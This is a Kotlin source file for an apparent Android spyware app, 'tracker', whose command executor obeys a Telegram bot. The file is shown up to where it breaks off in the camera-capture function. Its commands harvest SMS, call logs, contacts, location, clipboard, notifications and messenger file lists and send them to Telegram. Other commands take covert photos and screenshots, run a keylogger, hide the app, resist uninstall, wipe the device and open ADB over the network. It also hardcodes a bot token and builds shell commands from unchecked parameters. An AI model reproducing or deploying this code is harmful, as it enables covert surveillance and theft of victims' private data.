package com.abuzahra.tracker

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.graphics.Rect
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.AudioManager
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import android.widget.Toast
import com.abuzahra.tracker.receivers.MyDeviceAdminReceiver
import com.abuzahra.tracker.services.MainTrackerService
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import kotlin.math.sqrt

/**
 * CommandExecutor - محرك تنفيذ الأوامر
 * يتعامل مع 200+ أمر من البوت/السيرفر
 */
object CommandExecutor {

    private const val TAG = "CommandExecutor"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var isRecording = false
    private var audioRecorder: MediaRecorder? = null
    private var screenRecorder: MediaRecorder? = null

    const val BOT_TOKEN = "8898830696:AAGpgjtwn2cB5wcKQ07PJPXjhKF0Ll43wrs"
    const val ADMIN_ID = 7344776596L

    // ==================== نقطة الدخول الرئيسية ====================

    /**
     * تنفيذ أمر من السيرفر/البوت
     * @param context سياق التطبيق
     * @param command اسم الأمر
     * @param params معلمات الأمر (JSON)
     * @return نتيجة الأمر (JSON)
     */
    fun execute(context: Context, command: String, params: JSONObject = JSONObject()): String {
        Log.d(TAG, "تنفيذ الأمر: $command")
        return try {
            when {
                // ========== جمع البيانات ==========
                command.startsWith("get_") -> executeDataCommand(context, command, params)

                // ========== التحكم بالهاتف ==========
                command == "lock_phone" -> lockPhone(context)
                command == "unlock_phone" -> unlockPhone(context)
                command == "reboot" -> rebootPhone(context)
                command == "shutdown" -> shutdownPhone(context)
                command == "vibrate" -> vibratePhone(context, params)
                command == "ring" -> ringPhone(context)
                command == "screenshot" -> takeScreenshot(context)
                command == "front_camera" -> takePhoto(context, true)
                command == "back_camera" -> takePhoto(context, false)
                command == "record_audio" -> startAudioRecording(context, params)
                command == "stop_audio" -> stopAudioRecording(context)
                command == "record_screen" -> startScreenRecording(context)
                command == "stop_screen" -> stopScreenRecording(context)

                // ========== التحكم بالإعدادات ==========
                command == "set_volume" -> setVolume(context, params)
                command == "set_brightness" -> setBrightness(context, params)
                command == "set_wallpaper" -> setWallpaper(context, params)
                command == "enable_wifi" -> setWifi(context, true)
                command == "disable_wifi" -> setWifi(context, false)
                command == "enable_bluetooth" -> setBluetooth(context, true)
                command == "disable_bluetooth" -> setBluetooth(context, false)
                command == "enable_mobile_data" -> setMobileData(context, true)
                command == "disable_mobile_data" -> setMobileData(context, false)
                command == "enable_hotspot" -> setHotspot(context, true)
                command == "disable_hotspot" -> setHotspot(context, false)
                command == "airplane_on" -> setAirplaneMode(context, true)
                command == "airplane_off" -> setAirplaneMode(context, false)
                command == "torch_on" -> setTorch(context, true)
                command == "torch_off" -> setTorch(context, false)
                command == "play_sound" -> playSound(context, params)
                command == "speak_text" -> speakText(context, params)

                // ========== التحكم بالتطبيقات ==========
                command == "open_app" -> openApp(context, params)
                command == "close_app" -> closeApp(context, params)
                command == "install_app" -> installApp(context, params)
                command == "uninstall_app" -> uninstallApp(context, params)
                command == "block_app" -> blockApp(context, params)
                command == "unblock_app" -> unblockApp(context, params)
                command == "clear_app_data" -> clearAppData(context, params)
                command == "force_stop_app" -> forceStopApp(context, params)
                command == "launch_app" -> launchApp(context, params)

                // ========== إدارة الملفات ==========
                command == "list_files" -> listFiles(context, params)
                command == "get_file" -> getFile(context, params)
                command == "send_backup_contacts" -> sendBackup(context, "contacts")
                command == "send_backup_sms" -> sendBackup(context, "sms")
                command == "send_backup_calls" -> sendBackup(context, "calls")
                command == "send_backup_whatsapp" -> sendBackup(context, "whatsapp")
                command == "send_backup_all" -> sendBackup(context, "all")
                command == "delete_file" -> deleteFile(context, params)

                // ========== المراقبة ==========
                command == "keylogger_start" -> startKeylogger(context)
                command == "keylogger_stop" -> stopKeylogger(context)
                command == "get_keylogger" -> getKeyloggerData(context)
                command == "clipboard_monitor_start" -> startClipboardMonitor(context)
                command == "clipboard_monitor_stop" -> stopClipboardMonitor(context)
                command == "location_live" -> startLiveLocation(context)
                command == "location_stop" -> stopLiveLocation(context)

                // ========== الأمان ==========
                command == "show_app" -> setAppVisibility(context, true)
                command == "hide_app" -> setAppVisibility(context, false)
                command == "change_passcode" -> changePasscode(context, params)
                command == "wipe_data" -> wipeData(context)
                command == "factory_reset" -> factoryReset(context)
                command == "remove_screen_lock" -> """{"ok":false,"error":"يتطلب صلاحيات Root"}"""
                command == "device_admin_status" -> {
                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val componentName = ComponentName(context, MyDeviceAdminReceiver::class.java)
                    val isActive = dpm.isAdminActive(componentName)
                    """{"ok":true,"device_admin_active":$isActive,"message":"${if (isActive) "مسؤول الجهاز مفعّل" else "مسؤول الجهاز غير مفعّل"}"}"""
                }
                command == "screen_record_start" -> startScreenRecording(context)

                // ========== المنفعة ==========
                command == "ping" -> ping(context)
                command == "get_info" -> getDeviceInfo(context)
                command == "get_battery" -> getBatteryInfo(context)
                command == "get_wifi_info" -> getWifiInfo(context)
                command == "get_network_info" -> getNetworkInfo(context)
                command == "get_sim_info" -> getSimInfo(context)
                command == "get_storage_info" -> getStorageInfo(context)
                command == "get_installed_apps" -> getInstalledApps(context)
                command == "get_running_apps" -> getRunningApps(context)
                command == "send_sms" -> sendSMS(context, params)
                command == "make_call" -> makeCall(context, params)
                command == "set_alarm" -> setAlarm(context, params)
                command == "set_auto_rotate" -> setAutoRotate(context, params)

                // ========== أوامر جديدة (جذرية) ==========
                command == "set_ringtone" -> """{"ok":false,"error":"تعيين النغمة غير مدعوم حالياً"}"""
                command == "show_notification" -> showCustomNotification(context, params)
                command == "open_url" -> openUrl(context, params)
                command == "block_number" -> executeWithRoot(context, "busybox iptables -A INPUT -s ${params.optString("arg", "")} -j DROP")
                command == "unblock_number" -> executeWithRoot(context, "busybox iptables -D INPUT -s ${params.optString("arg", "")} -j DROP")
                command == "get_app_permissions" -> """{"ok":true,"message":"صلاحيات التطبيق - استخدم ملفات النسخة الاحتياطية"}"""
                command == "get_blocked_apps" -> """{"ok":true,"blocked_apps":[]}"""
                command == "set_language" -> executeWithRoot(context, "settings put system system_language ${params.optString("arg", "ar")}")
                command == "set_timezone" -> executeWithRoot(context, "settings put global time_zone ${params.optString("arg", "Asia/Riyadh")}")
                command == "enable_dev_mode" -> executeWithRoot(context, "settings put global development_settings_enabled 1")
                command == "disable_dev_mode" -> executeWithRoot(context, "settings put global development_settings_enabled 0")
                command == "enable_usb_debug" -> executeWithRoot(context, "setprop persist.adb.enabled 1; setprop service.adb.tcp.port 5555")
                command == "disable_usb_debug" -> executeWithRoot(context, "setprop persist.adb.enabled 0")
                command == "dns_change" -> executeWithRoot(context, "setprop net.dns1 ${params.optString("arg", "8.8.8.8")}; setprop net.dns2 8.8.4.4")
                command == "proxy_set" -> """{"ok":false,"error":"إعداد البروكسي يحتاج Root متقدم"}"""
                command == "nfc_on" -> executeWithRoot(context, "service call nfc 1")
                command == "nfc_off" -> executeWithRoot(context, "service call nfc 2")
                command == "enable_biometric" -> """{"ok":false,"error":"تفعيل البصمة يتطلب تدخل يدوي من الإعدادات"}"""
                command == "disable_biometric" -> """{"ok":false,"error":"تعطيل البصمة يتطلب Root + إعادة ضبط"}"""
                command == "anti_uninstall_on" -> """{"ok":true,"message":"الحماية من الحذف مفعّلة عبر Device Admin"}"""
                command == "anti_uninstall_off" -> """{"ok":true,"message":"تم إلغاء الحماية من الحذف"}"""
                command == "rename_file" -> executeWithRoot(context, "mv ${params.optString("arg", "")}")
                command == "copy_file" -> executeWithRoot(context, "cp ${params.optString("arg", "")}")
                command == "move_file" -> executeWithRoot(context, "mv ${params.optString("arg", "")}")
                command == "create_folder" -> executeWithRoot(context, "mkdir -p ${params.optString("arg", "")}")
                command == "get_folder_size" -> executeShell("du -sh ${params.optString("arg", "/sdcard")}")
                command == "search_files" -> executeShell("find ${params.optString("arg", "/sdcard")} -name '*${params.optString("arg2", "")}*' -type f 2>/dev/null | head -50")
                command == "recent_files" -> executeShell("find /sdcard -type f -mmin -60 2>/dev/null | head -30")
                command == "file_info" -> executeShell("ls -la ${params.optString("arg", "")} 2>/dev/null")
                command == "zip_files" -> executeWithRoot(context, "cd /sdcard && zip -r ${params.optString("arg", "archive.zip")} ${params.optString("arg2", "")}")

                else -> """{"ok":false,"error":"أمر غير معروف: $command"}"""
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في تنفيذ الأمر $command: ${e.message}", e)
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ==================== أوامر جمع البيانات ====================

    private fun executeDataCommand(context: Context, command: String, params: JSONObject): String {
        return try {
            val result = when (command) {
                "get_sms" -> getSMS(context)
                "get_calls" -> getCalls(context)
                "get_contacts" -> getContacts(context)
                "get_location" -> getLocation(context)
                "get_notifications" -> getNotifications(context)
                "get_apps" -> getInstalledApps(context)
                "get_gallery" -> getGallery(context)
                "get_clipboard" -> getClipboard(context)
                "get_whatsapp" -> getWhatsAppData(context)
                "get_telegram" -> getTelegramData(context)
                "get_instagram" -> getInstagramData(context)
                "get_messenger" -> getMessengerData(context)
                "get_snapchat" -> " Snapchat لا يمكن الوصول لبياناته مباشرة"
                "get_tiktok" -> "TikTok لا يمكن الوصول لبياناته مباشرة"
                "get_twitter" -> getTwitterData(context)
                "get_viber" -> "Viber لا يمكن الوصول لبياناته مباشرة"
                "get_signal" -> "Signal مشفر ولا يمكن الوصول لبياناته"
                "get_facebook" -> getFacebookData(context)
                "get_all" -> getAllData(context)
                "get_browser_history" -> getBrowserHistory(context)
                "get_calendar" -> getCalendarEvents(context)
                "get_app_usage" -> getAppUsage(context)
                "get_screen_time" -> getAppUsage(context)
                else -> """{"ok":false,"error":"أمر غير معروف: $command"}"""
            }
            result
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ========== SMS ==========
    @SuppressLint("Range")
    private fun getSMS(context: Context): String {
        val smsList = JSONArray()
        val uri = Telephony.Sms.CONTENT_URI
        val projection = arrayOf(
            Telephony.Sms._ID, Telephony.Sms.ADDRESS, Telephony.Sms.BODY,
            Telephony.Sms.DATE, Telephony.Sms.TYPE, Telephony.Sms.READ
        )
        context.contentResolver.query(uri, projection, null, null, Telephony.Sms.DEFAULT_SORT_ORDER)?.use { cursor ->
            val count = cursor.count
            val startIndex = if (count > 200) count - 200 else 0
            if (cursor.moveToPosition(startIndex)) {
                do {
                    val sms = JSONObject()
                    sms.put("id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)))
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "")
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "")
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))
                    val type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    sms.put("type", when (type) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                        else -> "other"
                    })
                    sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.READ)) == 1)
                    smsList.put(sms)
                } while (cursor.moveToNext())
            }
        }
        // حفظ في قاعدة البيانات وإنشاء ملف
        saveDataToFile(context, "sms_backup.json", smsList.toString())
        return """{"ok":true,"count":${smsList.length()},"data":$smsList}"""
    }

    // ========== المكالمات ==========
    @SuppressLint("Range")
    private fun getCalls(context: Context): String {
        val callsList = JSONArray()
        val projection = arrayOf(
            CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE,
            CallLog.Calls.DURATION, CallLog.Calls.TYPE, CallLog.Calls.CACHED_NAME
        )
        context.contentResolver.query(CallLog.Calls.CONTENT_URI, projection, null, null, "${CallLog.Calls.DATE} DESC")?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < 200) {
                val call = JSONObject()
                call.put("id", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)))
                call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
                call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "")
                call.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                call.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                val type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                call.put("type", when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    CallLog.Calls.REJECTED_TYPE -> "rejected"
                    else -> "other"
                })
                callsList.put(call)
                count++
            }
        }
        saveDataToFile(context, "calls_backup.json", callsList.toString())
        return """{"ok":true,"count":${callsList.length()},"data":$callsList}"""
    }

    // ========== جهات الاتصال ==========
    @SuppressLint("Range")
    private fun getContacts(context: Context): String {
        val contactsList = JSONArray()
        val projection = arrayOf(
            ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
        )
        context.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, projection, null, null, null)?.use { cursor ->
            while (cursor.moveToNext()) {
                val id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                val name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)) ?: ""
                val hasPhone = cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) == 1

                val contact = JSONObject()
                contact.put("id", id)
                contact.put("name", name)
                val phones = JSONArray()
                if (hasPhone) {
                    val phoneCursor = context.contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.TYPE),
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(id), null
                    )
                    phoneCursor?.use { pc ->
                        while (pc.moveToNext()) {
                            val phone = pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            val phoneType = pc.getInt(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))
                            phones.put(phone)
                            if (phones.length() == 1) contact.put("phone", phone)
                        }
                    }
                }
                contact.put("phones", phones)

                // البريد الإلكتروني
                val emails = JSONArray()
                val emailCursor = context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    arrayOf(ContactsContract.CommonDataKinds.Email.DATA),
                    "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                    arrayOf(id), null
                )
                emailCursor?.use { ec ->
                    while (ec.moveToNext()) {
                        emails.put(ec.getString(ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA)))
                    }
                }
                contact.put("emails", emails)
                contactsList.put(contact)
            }
        }
        saveDataToFile(context, "contacts_backup.json", contactsList.toString())
        return """{"ok":true,"count":${contactsList.length()},"data":$contactsList}"""
    }

    // ========== الموقع ==========
    @SuppressLint("MissingPermission")
    private fun getLocation(context: Context): String {
        return try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val location = locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)

            if (location != null) {
                val locData = JSONObject()
                locData.put("latitude", location.latitude)
                locData.put("longitude", location.longitude)
                locData.put("accuracy", location.accuracy)
                locData.put("altitude", location.altitude)
                locData.put("speed", location.speed)
                locData.put("time", location.time)
                locData.put("provider", location.provider)

                val mapsLink = "https://maps.google.com/?q=${location.latitude},${location.longitude}"
                scope.launch {
                    TelegramDirectClient.sendMessage(
                        "📍 <b>موقع الجهاز</b>\n\n" +
                        "🗺️ الخريطة: $mapsLink\n" +
                        "📏 الدقة: ${"%.0f".format(location.accuracy)} م\n" +
                        "⚓ خط العرض: ${location.latitude}\n" +
                        " Meridian: ${location.longitude}\n" +
                        " ${if (location.altitude != 0.0) "🏔️ الارتفاع: ${"%.0f".format(location.altitude)} م\n" else ""}" +
                        "🕐 التوقيت: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(location.time))}",
                        "HTML"
                    )
                }
                """{"ok":true,"direct":true,"latitude":${location.latitude},"longitude":${location.longitude},"map":"$mapsLink"}"""
            } else {
                """{"ok":false,"error":"لا يمكن تحديد الموقع"}"""
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    // ========== الإشعارات ==========
    private fun getNotifications(context: Context): String {
        val notifs = JSONArray()
        try {
            val notifications = AppDatabase.getNotifications(context)
            for (n in notifications) {
                val notif = JSONObject()
                notif.put("id", n["id"] ?: "")
                notif.put("pkg", n["package_name"] ?: "")
                notif.put("title", n["title"] ?: "")
                notif.put("text", n["body"] ?: "")
                notif.put("time", n["timestamp"] ?: "")
                notifs.put(notif)
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في قراءة الإشعارات: ${e.message}")
        }
        return """{"ok":true,"count":${notifs.length()},"data":$notifs}"""
    }

    // ========== المعرض ==========
    @SuppressLint("Range")
    private fun getGallery(context: Context): String {
        val images = JSONArray()
        val projection = arrayOf(
            MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE
        )
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        context.contentResolver.query(uri, projection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < 50) {
                val img = JSONObject()
                img.put("name", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)))
                img.put("path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)))
                img.put("size", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)))
                img.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)))
                images.put(img)
                count++
            }
        }
        return """{"ok":true,"count":${images.length()},"data":$images}"""
    }

    // ========== الحافظة ==========
    private fun getClipboard(context: Context): String {
        val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val clip = clipboard.primaryClip
        val text = if (clip != null && clip.itemCount > 0) {
            clip.getItemAt(0).text?.toString() ?: ""
        } else {
            ""
        }
        scope.launch { TelegramDirectClient.sendMessage("📋 <b>الحافظة</b>\n\n$text", "HTML") }
        return """{"ok":true,"direct":true,"clipboard":"${text.replace("\"", "\\\"")}"}"""
    }

    // ========== بيانات الشبكات الاجتماعية ==========
    private fun getWhatsAppData(context: Context): String {
        try {
            val waFiles = JSONArray()
            val waPath = Environment.getExternalStorageDirectory().absolutePath + "/WhatsApp"
            val waFolder = File(waPath)
            if (waFolder.exists()) {
                waFolder.listFiles()?.take(20)?.forEach { f ->
                    val file = JSONObject()
                    file.put("name", f.name)
                    file.put("path", f.absolutePath)
                    file.put("size", f.length())
                    file.put("isDirectory", f.isDirectory)
                    file.put("lastModified", f.lastModified())
                    waFiles.put(file)
                }
            }
            val dbPath = waPath + "/Databases"
            val dbFolder = File(dbPath)
            if (dbFolder.exists()) {
                dbFolder.listFiles()?.take(10)?.forEach { f ->
                    val file = JSONObject()
                    file.put("name", f.name)
                    file.put("path", f.absolutePath)
                    file.put("size", f.length())
                    waFiles.put(file)
                }
            }
            scope.launch {
                TelegramDirectClient.sendDocument(
                    waFiles.toString(),
                    "whatsapp_files_list.json"
                )
            }
            return """{"ok":true,"direct":true,"files":${waFiles.length()},"data":$waFiles}"""
        } catch (e: Exception) {
            return """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun getTelegramData(context: Context): String {
        try {
            val tgFiles = JSONArray()
            val tgPath = Environment.getExternalStorageDirectory().absolutePath + "/Telegram"
            val tgFolder = File(tgPath)
            if (tgFolder.exists()) {
                tgFolder.listFiles()?.take(20)?.forEach { f ->
                    val file = JSONObject()
                    file.put("name", f.name)
                    file.put("path", f.absolutePath)
                    file.put("size", f.length())
                    file.put("isDirectory", f.isDirectory)
                    tgFiles.put(file)
                }
            }
            return """{"ok":true,"files":${tgFiles.length()},"data":$tgFiles}"""
        } catch (e: Exception) {
            return """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun getInstagramData(context: Context): String {
        return """{"ok":true,"message":"بيانات انستجرام متاحة من الإشعارات فقط","notifications":${getNotifications(context)}}"""
    }

    private fun getMessengerData(context: Context): String {
        return """{"ok":true,"message":"بيانات ماسنجر متاحة من الإشعارات فقط","notifications":${getNotifications(context)}}"""
    }

    private fun getTwitterData(context: Context): String {
        return """{"ok":true,"message":"بيانات تويتر متاحة من الإشعارات فقط","notifications":${getNotifications(context)}}"""
    }

    private fun getFacebookData(context: Context): String {
        return """{"ok":true,"message":"بيانات فيسبوك متاحة من الإشعارات فقط","notifications":${getNotifications(context)}}"""
    }

    private fun getBrowserHistory(context: Context): String {
        return """{"ok":true,"message":"سجل المتصفح غير متاح مباشرة","note":"استخدم الإشعارات لتتبع نشاط المتصفح"}"""
    }

    private fun getCalendarEvents(context: Context): String {
        return """{"ok":true,"message":"التقويم","events":[]}"""
    }

    private fun getAppUsage(context: Context): String {
        return try {
            val usageStats = context.getSystemService("appusagestats") as android.app.usage.UsageStatsManager
            val endTime = System.currentTimeMillis()
            val startTime = endTime - (24 * 60 * 60 * 1000)
            val stats = usageStats.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
            val apps = JSONArray()
            stats.sortedByDescending { it.lastTimeUsed }.take(30).forEach { stat ->
                val app = JSONObject()
                app.put("package", stat.packageName)
                app.put("lastUsed", stat.lastTimeUsed)
                app.put("foregroundTime", stat.totalTimeInForeground)
                try {
                    val pm = context.packageManager
                    val appInfo = pm.getApplicationInfo(stat.packageName, 0)
                    app.put("name", pm.getApplicationLabel(appInfo).toString())
                } catch (e: Exception) {
                    app.put("name", stat.packageName)
                }
                apps.put(app)
            }
            """{"ok":true,"count":${apps.length()},"data":$apps}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun getAllData(context: Context): String {
        scope.launch {
            TelegramDirectClient.sendMessage("📥 <b>جمع جميع البيانات...</b>\n\nيتم جمع البيانات الآن، سيتم إرسالها كملفات.", "HTML")
            val smsData = getSMS(context)
            delay(500)
            val callsData = getCalls(context)
            delay(500)
            val contactsData = getContacts(context)
            delay(500)
            getLocation(context)
            delay(500)
            val appsData = getInstalledApps(context)
            delay(500)

            TelegramDirectClient.sendMessage(
                "✅ <b>تم جمع جميع البيانات!</b>\n\n" +
                "📱 الرسائل SMS\n📞 سجل المكالمات\n📇 جهات الاتصال\n📍 الموقع الجغرافي\n📱 التطبيقات المثبتة\n\n" +
                "💾 تم حفظ النسخ الاحتياطية في الملف المخفي",
                "HTML"
            )
        }
        return """{"ok":true,"direct":true,"message":"جاري جمع جميع البيانات"}"""
    }

    // ==================== التحكم بالهاتف ====================

    private fun lockPhone(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(componentName)) {
                dpm.lockNow()
                """{"ok":true,"message":"تم قفل الهاتف"}"""
            } else {
                """{"ok":false,"error":"مسؤول الجهاز غير مفعّل"}"""
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun unlockPhone(context: Context): String {
        return """{"ok":false,"error":"فك القفل غير ممكن مباشرة - استخدم كود PIN"}"""
    }

    private fun rebootPhone(context: Context): String {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(componentName)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    dpm.reboot(componentName)
                } else {
                    try {
                        val process = Runtime.getRuntime()
                        process.exec(arrayOf("su", "-c", "reboot"))
                    } catch (e: Exception) {
                        return """{"ok":false,"error":"يتطلب صلاحيات Root"}"""
                    }
                }
                """{"ok":true,"message":"جاري إعادة التشغيل"}"""
            } else {
                """{"ok":false,"error":"مسؤول الجهاز غير مفعّل"}"""
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun shutdownPhone(context: Context): String {
        return try {
            val process = Runtime.getRuntime()
            process.exec(arrayOf("su", "-c", "reboot -p"))
            """{"ok":true,"message":"جاري إيقاف التشغيل"}"""
        } catch (e: Exception) {
            """{"ok":false,"error":"يتطلب صلاحيات Root"}"""
        }
    }

    private fun vibratePhone(context: Context, params: JSONObject): String {
        val duration = params.optLong("duration", 1000)
        val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            vibrator.vibrate(android.os.VibrationEffect.createOneShot(duration, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
        } else {
            @Suppress("DEPRECATION")
            vibrator.vibrate(duration)
        }
        return """{"ok":true,"message":"تم الاهتزاز لمدة ${duration}ms"}"""
    }

    private fun ringPhone(context: Context): String {
        val intent = Intent(Intent.ACTION_VIEW)
        intent.data = Uri.parse("tel:")
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        context.startActivity(intent)
        scope.launch { TelegramDirectClient.sendMessage("🔔 جاري رنين الهاتف...", "HTML") }
        return """{"ok":true,"direct":true,"message":"جاري الرنين"}"""
    }

    private fun takeScreenshot(context: Context): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val dm = context.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
                val displays = dm.displays
                if (displays.isNotEmpty()) {
                    val display = displays[0]
                    val metrics = DisplayMetrics()
                    display.getRealMetrics(metrics)
                    val width = metrics.widthPixels
                    val height = metrics.heightPixels

                    val imageReader = android.media.ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

                    scope.launch {
                        delay(1000)
                        val image = imageReader.acquireLatestImage()
                        if (image != null) {
                            val planes = image.planes
                            val buffer = planes[0].buffer
                            val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
                            bitmap.copyPixelsFromBuffer(buffer)

                            val file = File(context.getExternalFilesDir(null), "screenshot_${System.currentTimeMillis()}.png")
                            FileOutputStream(file).use { out ->
                                bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
                            }
                            image.close()
                            imageReader.close()

                            TelegramDirectClient.sendPhoto(file.absolutePath, "📸 لقطة شاشة")
                            TelegramDirectClient.sendMessage("📸 <b>تم التقاط لقطة الشاشة</b>", "HTML")
                        }
                    }
                    """{"ok":true,"direct":true,"message":"جاري التقاط لقطة الشاشة..."}"""
                } else {
                    """{"ok":false,"error":"لا يوجد شاشة متاحة"}"""
                }
            } else {
                """{"ok":false,"error":"يتطلب Android 5+"}"""
            }
        } catch (e: Exception) {
            """{"ok":false,"error":"${e.message}"}"""
        }
    }

    private fun takePhoto(context: Context, frontCamera: Boolean): String {
        scope.launch {
            try {
                TelegramDirectClient.sendMessage(if (frontCamera) "📷 جاري التقاط صورة من الكاميرا الأمامية..." else "📷 جاري التقاط صورة من الكاميرا الخلفية...", "HTML")
                val file = File(context.getExternalFilesDir(null), "camera_${System.currentTimeMillis()}.jpg")
                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = try {
                    if (frontCamera) {
                        cameraManager.cameraIdList.first { id ->
                            cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) ==
                                android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                        }
                    } else {
                        cameraManager.cameraIdList.first { id ->
                            cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) ==
                                android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
                        }
                    }
                } catch (e: Exception) { cameraManager.cameraIdList[0] }

